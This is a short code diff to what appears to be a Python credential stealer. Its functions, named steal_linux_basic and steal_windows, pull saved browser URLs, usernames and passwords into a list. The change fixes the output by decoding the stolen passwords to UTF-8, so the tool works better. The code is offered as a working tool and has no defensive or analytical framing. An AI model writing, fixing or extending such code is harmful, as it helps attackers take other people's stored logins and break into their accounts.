@@ -58,7 +58,7 @@ def steal_linux_basic():
 			if(len(result[2]) <= 0):
 				result[2] = "(Blank)"
 			# Append to results
-			recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=result[2]))
+			recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=result[2].decode('utf-8')))
 		return recovered
 	else:
 		# There are no saved passwords
@@ -136,7 +136,7 @@ def steal_windows():
 				if(len(password) <= 0):
 					password = "(Blank)"
 				# Append the result
-				recovered.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
+				recovered.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password.decode('utf-8')))
 		return recovered
 	else:
 		# There are no saved passwords
